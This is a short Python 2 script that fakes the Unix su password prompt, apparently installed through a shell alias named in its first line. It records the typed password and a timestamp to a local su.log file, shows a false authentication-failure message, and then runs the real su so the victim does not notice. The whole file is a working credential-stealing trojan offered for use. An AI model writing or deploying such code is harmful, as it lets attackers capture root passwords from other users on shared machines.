#alias su="python root.py"
import os
import sys
import getpass
import time

current_time = time.strftime("%Y-%m-%d %H:%M")
logfile = "su.log"

fail_str = "su: Authentication failure"

try:
    passwd = getpass.getpass(prompt="Password: ")
    file=open(logfile, "a")
    file.write("[%s]\t %s" % (passwd, current_time))
    file.write("\n")
    file.close()
except:
    pass
time.sleep(1)
print fail_str
os.system("su")
